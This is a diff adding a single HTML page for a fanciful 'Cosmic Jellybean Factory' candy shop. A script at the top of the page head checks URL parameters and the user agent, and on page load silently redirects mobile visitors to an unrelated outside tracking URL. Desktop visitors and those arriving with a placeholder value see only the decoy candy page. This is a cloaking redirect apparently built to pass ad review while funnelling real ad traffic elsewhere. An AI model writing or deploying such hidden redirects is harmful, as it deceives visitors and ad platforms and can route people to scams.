@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/7030fb24-f71e-4d19-916a-a1c232f79601?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Jellybean Factory</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #ff00ff, #00ffff);
+            color: #333;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+        }
+        header {
+            background-color: rgba(255, 255, 255, 0.7);
+            padding: 20px;
+            text-align: center;
+            grid-column: span 3;
+        }
+        main {
+            background-color: rgba(0, 255, 0, 0.3);
+            padding: 20px;
+            border-radius: 15px;
+            grid-column: span 2;
+        }
+        aside {
+            background-color: rgba(255, 165, 0, 0.5);
+            padding: 20px;
+            border-radius: 15px;
+        }
+        footer {
+            background-color: rgba(0, 0, 255, 0.5);
+            color: white;
+            text-align: center;
+            padding: 10px;
+            grid-column: span 3;
+        }
+        h1 {
+            font-size: 3em;
+            text-shadow: 2px 2px 4px #000000;
+        }
+        .rotate {
+            animation: spin 5s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1 class="rotate">🍬 Cosmic Jellybean Factory 🍬</h1>
+        </header>
+        <main>
+            <h2>Welcome to Our Intergalactic Confectionery!</h2>
+            <p>Discover jellybeans that defy gravity and tickle your taste buds with flavors from across the universe!</p>
+            <ul>
+                <li>Supernova Strawberry</li>
+                <li>Quantum Quince</li>
+                <li>Nebula Nectarine</li>
+            </ul>
+        </main>
+        <aside>
+            <h3>Space-Time Special</h3>
+            <p>Buy a bag of our Milky Way Mix and get a free Black Hole Berry!</p>
+        </aside>
+        <footer>
+            <p>&copy; 2023 Cosmic Jellybean Factory. All rights reserved.</p>
+            <p><a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+        </footer>
+    </div>
+</body>
+</html>
